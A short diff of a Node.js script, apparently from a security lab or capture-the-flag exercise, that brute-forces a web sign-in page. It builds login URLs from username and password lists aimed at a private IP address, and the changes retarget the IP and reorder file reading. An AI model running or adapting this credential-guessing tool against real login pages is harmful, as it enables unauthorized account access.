@@ -2,7 +2,7 @@ const fs = require('fs');
 const loginsFile = 'logins';
 const passwordsFile = 'passwords';
 const resultFile = 'result';
-const ip = '10.80.183.38';
+const ip = '10.171.57.148';
 
 const getUrl = (ip, login, password) =>
   `http://${ip}/?page=signin&username=${login}&password=${password}&Login=Login#`;
@@ -35,10 +35,11 @@ async function bruteForce(logins, passwords) {
 
 async function main() {
   const loginsFileRead = fs.readFileSync(loginsFile, { encoding: 'utf8' });
-  const logins = loginsFileRead.split(/\r?\n/);
-  const passwordsFileRead = fs.readFileSync(passwordsFile, {
+    const passwordsFileRead = fs.readFileSync(passwordsFile, {
     encoding: 'utf8',
   });
+  
+  const logins = loginsFileRead.split(/\r?\n/);
   const passwords = passwordsFileRead.split(/\r?\n/);
 
   if (!logins || !passwords) {
